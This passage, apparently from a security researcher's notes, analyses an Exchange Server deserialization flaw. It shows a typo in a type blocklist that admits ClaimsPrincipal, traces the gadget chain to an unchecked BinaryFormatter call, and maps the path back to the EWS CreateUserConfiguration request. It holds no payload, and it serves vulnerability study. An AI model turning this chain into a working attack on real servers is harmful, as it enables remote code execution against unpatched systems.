System.Collections.Generic;\r\n\r\nprivate static HashSet<string> BuildDisallowedTypesForDeserialization()  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return new HashSet<string>  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"Microsoft.Data.Schema.SchemaModel.ModelStore\",\r\n\t\t\t\"Microsoft.FailoverClusters.NotificationViewer.ConfigStore\",\r\n\t\t\t\"Microsoft.IdentityModel.Claims.WindowsClaimsIdentity\",\r\n\t\t\t\"Microsoft.Management.UI.Internal.FilterRuleExtensions\",\r\n\t\t\t\"Microsoft.Management.UI.FilterRuleExtensions\",\r\n\t\t\t\"Microsoft.Reporting.RdlCompile.ReadStateFile\",\r\n\t\t\t\"Microsoft.TeamFoundation.VersionControl.Client.PolicyEnvelope\",\r\n\t\t\t\"Microsoft.VisualStudio.DebuggerVisualizers.VisualizerObjectSource\",\r\n\t\t\t\"Microsoft.VisualStudio.Editors.PropPageDesigner.PropertyPageSerializationService+PropertyPageSerializationStore\",\r\n\t\t\t\"Microsoft.VisualStudio.EnterpriseTools.Shell.ModelingPackage\",\r\n\t\t\t\"Microsoft.VisualStudio.Modeling.Diagnostics.XmlSerialization\",\r\n\t\t\t\"Microsoft.VisualStudio.Publish.BaseProvider.Util\",\r\n\t\t\t\"Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties\",\r\n\t\t\t\"Microsoft.VisualStudio.Web.WebForms.ControlDesignerStateCache\",\r\n\t\t\t\"Microsoft.Web.Design.Remote.ProxyObject\",\r\n\t\t\t\"System.Activities.Presentation.WorkflowDesigner\",\r\n\t\t\t\"System.AddIn.Hosting.AddInStore\",\r\n\t\t\t\"System.AddIn.Hosting.Utils\",\r\n\t\t\t\"System.CodeDom.Compiler.TempFileCollection\",\r\n\t\t\t\"System.Collections.Hashtable\",\r\n\t\t\t\"System.ComponentModel.Design.DesigntimeLicenseContextSerializer\",\r\n\t\t\t\"System.Configuration.Install.AssemblyInstaller\",\r\n\t\t\t\"System.Configuration.SettingsPropertyValue\",\r\n\t\t\t\"System.Data.DataSet\",\r\n\t\t\t\"System.Data.DataViewManager\",\r\n\t\t\t\"System.Data.Design.MethodSignatureGenerator\",\r\n\t\t\t\"System.Data.Design.TypedDataSetGenerator\",\r\n\t\t\t\"System.Data.Design.TypedDataSetSchemaImporterExtension\",\r\n\t\t\t\"System.Data.SerializationFormat\",\r\n\t\t\t\"System.DelegateSerializationHolder\",\r\n\t\t\t\"System.Drawing.Design.ToolboxItemContainer\",\r\n\t\t\t\"System.Drawing.Design.ToolboxItemContainer+ToolboxItemSerializer\",\r\n\t\t\t\"System.IdentityModel.Services.Tokens.MachineKeySessionSecurityTokenHandler\",\r\n\t\t\t\"System.IdentityModel.Tokens.SessionSecurityToken\",\r\n\t\t\t\"System.IdentityModel.Tokens.SessionSecurityTokenHandler\",\r\n\t\t\t\"System.IO.FileSystemInfo\",\r\n\t\t\t\"System.Management.Automation.PSObject\",\r\n\t\t\t\"System.Management.IWbemClassObjectFreeThreaded\",\r\n\t\t\t\"System.Messaging.BinaryMessageFormatter\",\r\n\t\t\t\"System.Resources.ResourceReader\",\r\n\t\t\t\"System.Resources.ResXResourceSet\",\r\n\t\t\t\"System.Runtime.Remoting.Channels.BinaryClientFormatterSink\",\r\n\t\t\t\"System.Runtime.Remoting.Channels.BinaryClientFormatterSinkProvider\",\r\n\t\t\t\"System.Runtime.Remoting.Channels.BinaryServerFormatterSink\",\r\n\t\t\t\"System.Runtime.Remoting.Channels.BinaryServerFormatterSinkProvider\",\r\n\t\t\t\"System.Runtime.Remoting.Channels.CrossAppDomainSerializer\",\r\n\t\t\t\"System.Runtime.Remoting.Channels.SoapClientFormatterSink\",\r\n\t\t\t\"System.Runtime.Remoting.Channels.SoapClientFormatterSinkProvider\",\r\n\t\t\t\"System.Runtime.Remoting.Channels.SoapServerFormatterSink\",\r\n\t\t\t\"System.Runtime.Remoting.Channels.SoapServerFormatterSinkProvider\",\r\n\t\t\t\"System.Runtime.Serialization.Formatters.Binary.BinaryFormatter\",\r\n\t\t\t\"System.Runtime.Serialization.Formatters.Soap.SoapFormatter\",\r\n\t\t\t\"System.Runtime.Serialization.NetDataContractSerializer\",\r\n\t\t\t\"System.Security.Claims.ClaimsIdentity\",\r\n\t\t\t\"System.Security.ClaimsPrincipal\",\r\n\t\t\t\"System.Security.Principal.WindowsIdentity\",\r\n\t\t\t\"System.Security.Principal.WindowsPrincipal\",\r\n\t\t\t\"System.Security.SecurityException\",\r\n\t\t\t\"System.Web.Security.RolePrincipal\",\r\n\t\t\t\"System.Web.Script.Serialization.JavaScriptSerializer\",\r\n\t\t\t\"System.Web.Script.Serialization.SimpleTypeResolver\",\r\n\t\t\t\"System.Web.UI.LosFormatter\",\r\n\t\t\t\"System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem\",\r\n\t\t\t\"System.Web.UI.ObjectStateFormatter\",\r\n\t\t\t\"System.Windows.Data.ObjectDataProvider\",\r\n\t\t\t\"System.Windows.Forms.AxHost+State\",\r\n\t\t\t\"System.Windows.ResourceDictionary\",\r\n\t\t\t\"System.Workflow.ComponentModel.Activity\",\r\n\t\t\t\"System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector\",\r\n\t\t\t\"System.Xml.XmlDataDocument\",\r\n\t\t\t\"System.Xml.XmlDocument\"\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0};  \r\n\u00a0\u00a0\u00a0\u00a0}\r\n```\r\n\r\nThis is a bit hard to read, so lets take a look at the patch diff from [[Meld]]:\r\n\r\n![[Pasted image 20220205130924.png]]\r\n\r\nHuh looks like there was a typo in the `Security.System.Claims.ClaimsPrincipal` blacklist entry where it was typed as `Security.System.ClaimsPrincipal` aka we missed an extra `.Claims` in the name.\r\n\r\n## Why Security.System.Claims.ClaimsPrincipal Was Blocked - A Deeper Dive into The Root Issue\r\nLets look at the call chain here. If we decompile the code for `System.Security.Claims.ClaimsPrincipal` we can see mentions of `OnDeserialized` which has a more full explanation at https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.ondeserializedattribute?view=net-6.0. Note that it states `When OnDeserializedAttribute class is applied to a method, specifies that the method is called immediately after deserialization of an object in an object graph. The order of deserialization relative to other objects in the graph is non-deterministic.`\r\n\r\nOf particular interest is the `OnDeserializedMethod()` method which is called after deserialization takes place. Note that if there was a `OnDeserializingMethod` that would be called *during* deserialization which would also work.\r\n\r\nLooking into the class more we notice the following functions:\r\n\r\nInitializer. Note that this is labeled as `[NonSerialized]` so despite it calling the `Deserialize()` method it will not be called upon deserialization as it as explicitly declared itself as something that can't be deserialized. Thus we can't use this function to trigger the desired `Deserialize()` method call. Lets keep looking.\r\n```cs\r\n// System.Security.Claims.ClaimsPrincipal  \r\nusing System.Collections.Generic;  \r\nusing System.IO;  \r\nusing System.Runtime.Serialization;  \r\nusing System.Security.Principal;  \r\n  \r\n[OptionalField(VersionAdded = 2)]  \r\nprivate string m_version = \"1.0\";  \r\n[NonSerialized]  \r\nprivate List<ClaimsIdentity> m_identities = new List<ClaimsIdentity>();  \r\n[SecurityCritical]  \r\nprotected ClaimsPrincipal(SerializationInfo info, StreamingContext context)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0if (info == null)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0throw new ArgumentNullException(\"info\");  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0Deserialize(info, context);  \r\n}\r\n```\r\n\r\nThe next place to look is that weird `OnDeserialized()` method. Lets take a look at its code. We can see that the `[OnDeserialized]` class is applied to this method meaning that `method is called immediately after deserialization of an object in an object graph`. We can also see that it takes in a `StreamingContext` parameter and then proceeds to call `DeserializeIdentities()` with a variable known as `m_serializedClaimIdentities`:\r\n\r\n```cs\r\n// System.Security.Claims.ClaimsPrincipal  \r\nusing System.Runtime.Serialization;  \r\n  \r\n[OnDeserialized]  \r\n[SecurityCritical]  \r\nprivate void OnDeserializedMethod(StreamingContext context)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0if (!(this is ISerializable))  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0DeserializeIdentities(m_serializedClaimsIdentities);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0m_serializedClaimsIdentities = null;  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n}\r\n```\r\n\r\nBut where is `m_serializedClaimsIdentities` set? Well looking at the `OnSerializedMethod()` function we can see this is set when serializing the object, as explained at https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.ondeserializingattribute?view=net-6.0 in the code examples and as shown below:\r\n\r\n```cs\r\n// System.Security.Claims.ClaimsPrincipal  \r\nusing System.Runtime.Serialization;  \r\n  \r\n[OnSerializing]  \r\n[SecurityCritical]  \r\nprivate void OnSerializingMethod(StreamingContext context)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0if (!(this is ISerializable))  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0m_serializedClaimsIdentities = SerializeIdentities();  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n}\r\n```\r\n\r\nAlright so now we know how that is set, lets go back to the deserialization shall we? The code for `DeserializeIdentities()` can be seen below. Note that there is a call to `binaryFormatter.Deserialize(serializationStream2, null, fCheck: false);` in this code. `binaryFormatter.Deserialize()` is equivalent to `BinaryFormatter.Deserialize()`, which doesn't bind a checker to check what types are being deserialized, so this method is easily exploitable if no checks or incorrect checks are being done on the types being deserialized. This is the case here due to the incorrect implementation of the type blacklist.\r\n```cs\r\n// System.Security.Claims.ClaimsPrincipal  \r\nusing System.Collections.Generic;  \r\nusing System.Globalization;  \r\nusing System.IO;  \r\nusing System.Runtime.Serialization;  \r\nusing System.Runtime.Serialization.Formatters.Binary;  \r\nusing System.Security.Principal;  \r\n  \r\n[SecurityCritical]  \r\nprivate void DeserializeIdentities(string identities)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0m_identities = new List<ClaimsIdentity>();  \r\n\u00a0\u00a0\u00a0\u00a0if (string.IsNullOrEmpty(identities))  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return;  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0List<string> list = null;  \r\n\u00a0\u00a0\u00a0\u00a0BinaryFormatter binaryFormatter = new BinaryFormatter();  \r\n\u00a0\u00a0\u00a0\u00a0using MemoryStream serializationStream = new MemoryStream(Convert.FromBase64String(identities));  \r\n\u00a0\u00a0\u00a0\u00a0list = (List<string>)binaryFormatter.Deserialize(serializationStream, null, fCheck: false);  \r\n\u00a0\u00a0\u00a0\u00a0for (int i = 0; i < list.Count; i += 2)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ClaimsIdentity claimsIdentity = null;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0using (MemoryStream serializationStream2 = new MemoryStream(Convert.FromBase64String(list[i + 1])))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0claimsIdentity = (ClaimsIdentity)binaryFormatter.Deserialize(serializationStream2, null, fCheck: false);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (!string.IsNullOrEmpty(list[i]))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (!long.TryParse(list[i], NumberStyles.Integer, NumberFormatInfo.InvariantInfo, out var result))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0throw new SerializationException(Environment.GetResourceString(\"Serialization_CorruptedStream\"));  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0claimsIdentity = new WindowsIdentity(claimsIdentity, new IntPtr(result));  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0m_identities.Add(claimsIdentity);  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n}\r\n```\r\n\r\nSo from this we can confirm that the chain for deserialization looks like this:\r\n\r\n```cs\r\nSystem.Security.Claims.ClaimsPrincipal.OnDeserializedMethod()  \r\n   System.Security.Claims.ClaimsPrincipal.DeserializeIdentities()  \r\n       BinaryFormatter.Deserialize()\r\n```\r\n\r\n# Quick review\r\n## TLDR\r\nWe now have a type, `TypedBinaryFormatter` that has a binder who incorrectly validates the types that `TypedBinaryFormatter` deserializes and which allows the `Security.Systems.Claims.ClaimsPrincipal` to go through which allows for arbitrary type deserialization.\r\n\r\n## Longer explanation\r\nAlright so lets quickly review what we know. We know we need to deserialize a `TypedBinaryFormatter` object whose `Deserialize()` method will result in a `ExchangeBinaryFormatterFactory.CreateBinaryFormatter()` call. This results in a new `ChainedSerializationBinder` class object being created whose `BindToType()` method that is used to validate the data that `TypedBinaryFormatter` will deserialize. `BindToType()` will call `ValidateTypeToDeserialize()` within the same class. This uses a blacklist in the variable `GlobalDisallowedTypesForDeserialization` which is set to the result of calling `ChainedSerializationBinder`'s `BuildDisallowedTypesForDeserialization()` method. Unfortunately this method had a typo so the `Security.System.Claims.ClaimsPrincipal` type was allowed though.\r\n\r\nIf we then deserialize an object of type `Security.System.Claims.ClaimsPrincipal` we can get it to hit a vulnerable `BinaryFormatter.Deserialize()` call via the call chain, which can deserialize arbitrary classes as this type of formatter doesn't use a binder to check what types it deserializes.\r\n\r\n```cs\r\nTypedBinaryFormatter.DeserializeObject(Stream, TypeBinder)\r\n\tTypedBinaryFormatter.Desearialize(Stream)\r\n\t\tSystem.Security.Claims.ClaimsPrincipal.OnDeserializedMethod()  \r\n\t\t   System.Security.Claims.ClaimsPrincipal.DeserializeIdentities()  \r\n\t\t       BinaryFormatter.Deserialize()\r\n```\r\n# The Source\r\n## Initial Inspection\r\nLets start at `Microsoft.Exchange.Compliance.Serialization.Formatters.TypedBinaryFormatter.Deserialize(Stream, SerializationBinder)` and work back. We start with this one as its the most common use case. If we look at the other remaining 3 function definition variations for the `Deserialize()` method, we will see that two of them have no callers, and the remaining one is a little more complex (I imagine its still viable but no need to complicate the beast when there are simpler ways!)\r\n\r\n![[Pasted image 20220205174401.png]]\r\n\r\nAs is shown above we can see that `Microsoft.Exchange.Compliance.Serialization.Formatters.TypedBinaryFormatter.Deserialize(Stream, SerializationBinder)` is called by `Microsoft.Exchange.Compliance.Serialization.Formatters.TypedBinaryFormatter.DeserializeObject(Stream, TypeBinder)`, which is turn called by `Microsoft.Exchange.Data.ApplicationLogic.Extension.ClientExtensionCollectionFormatter.Deserialize(Stream)`.\r\n\r\nSo deserialization chain is now:\r\n\r\n```cs\r\nMicrosoft.Exchange.Data.ApplicationLogic.Extension.ClientExtensionCollectionFormatter.Deserialize(Stream)\r\n\tTypedBinaryFormatter.DeserializeObject(Stream, TypeBinder)\r\n\t\tTypedBinaryFormatter.Desearialize(Stream)\r\n\t\t\tSystem.Security.Claims.ClaimsPrincipal.OnDeserializedMethod()  \r\n\t\t\t   System.Security.Claims.ClaimsPrincipal.DeserializeIdentities()  \r\n\t\t\t       BinaryFormatter.Deserialize()\r\n```\r\n\r\n## ILSpy And Interfaces - Finding Where Microsoft.Exchange.Data.ApplicationLogic.Extension.ClientExtensionCollectionFormatter.Deserialize(Stream) is Used\r\nAt this point we hit a snag, as it seems like this isn't called anywhere. However in [[ILSpy]] and we see we can see an `Implements` field that does not appear in [[dnSpy]] and if we expand this we can see that it has a `Implemented By` and `Used By` field. \r\n\r\nWe can see that `Microsoft.Exchange.Data.ApplicationLogic.Extension.ClientExtensionCollectionFormatter.Deserialize(Stream)` implements `Microsoft.Exchange.Data.ApplicationLogic.Extension.IClientExtensionCollectionFormatter.Deserialize` (note the `IClient` not `Client` part here indicating that this is an interface, not a normal class), and that this interface is used by `Microsoft.Exchange.Data.ApplicationLogic.Extension.OrgExtensionSerializer.TryDeserialize(IUserConfiguration userConfiguration, out OrgExtensionRetrievalResult result, out Exception exception)`, which will use this interface to call the `Microsoft.Exchange.Data.ApplicationLogic.Extension.ClientExtensionCollectionFormatter.Deserialize(Stream)` function.\r\n\r\n![[Pasted image 20220207195041.png]]\r\n\r\nWe can also verify that `Microsoft.Exchange.Data.ApplicationLogic.Extension.OrgExtensionSerializer` is essentially just an interface wrapper around the `ClientExtensionCollectionFormatter` interface:\r\n\r\n```cs\r\n// Microsoft.Exchange.Data.ApplicationLogic.Extension.OrgExtensionSerializer  \r\nprivate IClientExtensionCollectionFormatter formatter;\r\n```\r\n\r\nSo deserialization chain is now:\r\n\r\n```cs\r\nMicrosoft.Exchange.Data.ApplicationLogic.Extension.OrgExtensionSerializer.TryDeserialize(IUserConfiguration, out OrgExtensionRetrievalResult, out Exception)\r\n\tMicrosoft.Exchange.Data.ApplicationLogic.Extension.ClientExtensionCollectionFormatter.Deserialize(Stream)\r\n\t\tTypedBinaryFormatter.DeserializeObject(Stream, TypeBinder)\r\n\t\t\tTypedBinaryFormatter.Desearialize(Stream)\r\n\t\t\t\tSystem.Security.Claims.ClaimsPrincipal.OnDeserializedMethod()  \r\n\t\t\t\t   System.Security.Claims.ClaimsPrincipal.DeserializeIdentities()  \r\n\t\t\t\t       BinaryFormatter.Deserialize()\r\n```\r\n\r\n## Finding the Expected Data Types for Microsoft.Exchange.Data.ApplicationLogic.Extension.OrgExtensionSerializer.TryDeserialize\r\nThe code for `Microsoft.Exchange.Data.ApplicationLogic.Extension.OrgExtensionSerializer.TryDeserialize(IUserConfiguration userConfiguration, out OrgExtensionRetrievalResult result, out Exception exception)` can be seen below:\r\n\r\n```cs\r\n// Microsoft.Exchange.Data.ApplicationLogic.Extension.OrgExtensionSerializer  \r\nusing System;  \r\nusing System.Collections;  \r\nusing System.IO;  \r\nusing System.Runtime.Serialization;  \r\nusing Microsoft.Exchange.Data.Storage;  \r\n  \r\npublic bool TryDeserialize(IUserConfiguration userConfiguration, out OrgExtensionRetrievalResult result, out Exception exception)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0result = new OrgExtensionRetrievalResult();  \r\n\u00a0\u00a0\u00a0\u00a0exception = null;  \r\n\u00a0\u00a0\u00a0\u00a0IDictionary dictionary = userConfiguration.GetDictionary();  \r\n\u00a0\u00a0\u00a0\u00a0if (dictionary.Contains(\"OrgDO\"))  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0result.HasDefaultExtensionsWithDefaultStatesOnly = (bool)dictionary[\"OrgDO\"];  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0bool flag = false;  \r\n\u00a0\u00a0\u00a0\u00a0if (!result.HasDefaultExtensionsWithDefaultStatesOnly)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0using (Stream stream = userConfiguration.GetStream())  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0stream.Position = 0L;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0result.Extensions = formatter.Deserialize(stream);  <- DESERIALIZATION HERE\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return true;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0catch (SerializationException ex)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Tracer.TraceError(GetHashCode(), \"deserialization failed with {0}\", ex);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0flag = false;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0exception = ex;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return flag;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0return true;  \r\n}\r\n```\r\n\r\nLooking at the code here we can see that we appear to be deserializing a `stream` variable of type `Stream`, which is set to the result of calling `userConfiguration.GetStream()`. Further up in the code we can see `userConfiguration` is defined as an interface to the `UserConfiguration` class via the line `IUserConfiguration userConfiguration` in the parameter list. We can find more details on this class at https://docs.microsoft.com/en-us/dotnet/api/microsoft.exchange.webservices.data.userconfiguration?view=exchange-ews-api which mentions this is part of the Exchange EWS API.\r\n\r\nFurther Googling for `UserConfiguration` turns up https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/userconfiguration which references it as a EWS XML element that defines a single user configuration object with the following format:\r\n\r\n```xml\r\n<UserConfiguration> \r\n\t<UserConfigurationName/> \r\n\t<ItemId/> \r\n\t<Dictionary/> \r\n\t<XmlData/> \r\n\t<BinaryData/> \r\n</UserConfiguration>\r\n```\r\n\r\nWe also see there is a parent object called `CreateUserConfiguration`. Documentation for this object can be found at https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/createuserconfiguration where it is defined as follows:\r\n\r\n```xml\r\n<CreateUserConfiguration>\r\n   <UserConfiguration/>\r\n</CreateUserConfiguration>\r\n```\r\n\r\nOkay so this is great and all, but this leaves two questions. The first question is \"How do we actually use this data in a web request?\" and the second question is \"What is this data used for normally?\". Further Googling of `CreateUserConfiguration` answers the second question when we find https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/createuserconfiguration-operation which mentions that `The CreateUserConfiguration operation creates a user configuration object on a folder.` This also provides some data examples on how this might be used as a SOAP request. However it doesn't specify what endpoint we would have to send this to, leading to another open question. A second open question then becomes \"Okay I suppose I might want to debug this later on in the code when developing the exploit, but where is it implemented?\". Lets answer that second question now.\r\n\r\n## Identifying CreateUserConfiguration Code \r\nAs it turns out, finding the code that handles `CreateUserConfiguration` takes us down a bit of a winding path. We start with `Microsoft.Exchange.Data.Storage.IUserConfiguration` as the definition of the interface we saw earlier in the `Microsoft.Exchange.Data.ApplicationLogic.Extension.OrgExtensionSerializer.TryDeserialize(IUserConfiguration userConfiguration, out OrgExtensionRetrievalResult result, out Exception exception)` function definition. \r\n\r\nHowever once again we quickly realize that `IUserConfiguration` is just an interface class. Searching for `UserConfiguration` with the `Type` filter on eventually leads us to find the `Microsoft.Exchange.Data.Storage.UserConfiguration` type:\r\n\r\n![[Pasted image 20220207203836.png]]\r\n\r\nLooking inside this leads us to find `Microsoft.Exchange.Data.Storage.UserConfiguration.GetConfiguration`. \r\n\r\n```cs\r\n// Microsoft.Exchange.Data.Storage.UserConfiguration  \r\nusing Microsoft.Exchange.Diagnostics;  \r\nusing Microsoft.Exchange.Diagnostics.Components.Data.Storage;  \r\nusing Microsoft.Exchange.ExchangeSystem;  \r\n  \r\npublic static UserConfiguration GetConfiguration(Folder folder, UserConfigurationName configurationName, UserConfigurationTypes type, bool autoCreate)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0EnumValidator.ThrowIfInvalid(type, \"type\");  \r\n\u00a0\u00a0\u00a0\u00a0try  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return GetIgnoringCache(null, folder, configurationName, type);  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0catch (ObjectNotFoundException arg)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (ExTraceGlobals.StorageTracer.IsTraceEnabled(TraceType.ErrorTrace))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ExTraceGlobals.StorageTracer.TraceError(0L, \"UserConfiguration::GetConfiguration. User Configuration object not found. Exception = {0}.\", arg);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0if (autoCreate)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return Create(folder, configurationName, type);  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0return null;  \r\n}\r\n```\r\n\r\nAt this point, I knew that there has to be some way to create the user configuration object given the error message and wondered if there was a similarly named `CreateUserConfiguration` function, going off of the naming convention that seemed to be used for these functions. I searched for this and it turns out there was a function under `Microsoft.Exchange.Services.Core.CreateUserConfiguration` named `CreateUserConfiguration()`.\r\n\r\n![[Pasted image 20220207204246.png]]\r\n\r\nLets look at its code:\r\n\r\n```cs\r\n// Microsoft.Exchange.Services.Core.CreateUserConfiguration  \r\nusing Microsoft.Exchange.Services.Core.Types;  \r\n  \r\npublic CreateUserConfiguration(ICallContext callContext, CreateUserConfigurationRequest request) : base(callContext, request)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0serviceUserConfiguration = request.UserConfiguration;  \r\n\u00a0\u00a0\u00a0\u00a0ServiceCommandBase<ICallContext>.ThrowIfNull(serviceUserConfiguration, \"serviceUserConfiguration\", \"CreateUserConfiguration::ctor\");  \r\n}\r\n```\r\n\r\nAlright so this seems to take in some request object from a HTTP request or similar, and then set the `serviceUserConfiguration` variable to the section in the request named `UserConfiguration` with `request.UserConfiguration`. We seem to be on the right track, so lets look at the `Microsoft.Exchange.Services.Core.Types.CreateUserConfigurationRequest` type of the `request` variable:\r\n\r\n```cs\r\n// Microsoft.Exchange.Services.Core.Types.CreateUserConfigurationRequest  \r\nusing System.Runtime.Serialization;  \r\nusing System.Xml.Serialization;  \r\nusing Microsoft.Exchange.Services;  \r\nusing Microsoft.Exchange.Services.Core;  \r\nusing Microsoft.Exchange.Services.Core.Types;  \r\n  \r\n[XmlType(\"CreateUserConfigurationRequestType\", Namespace = \"http://schemas.microsoft.com/exchange/services/2006/messages\")]  \r\n[DataContract(Namespace = \"http://schemas.datacontract.org/2004/07/Exchange\")]  \r\npublic class CreateUserConfigurationRequest : BaseRequest  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0[XmlElement]  \r\n\u00a0\u00a0\u00a0\u00a0[DataMember(IsRequired = true)]  \r\n\u00a0\u00a0\u00a0\u00a0public ServiceUserConfiguration UserConfiguration { get; set; }  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0internal override IServiceCommand GetServiceCommand(ICallContext callContext)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return new CreateUserConfiguration(callContext, this);  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public override BaseServerIdInfo 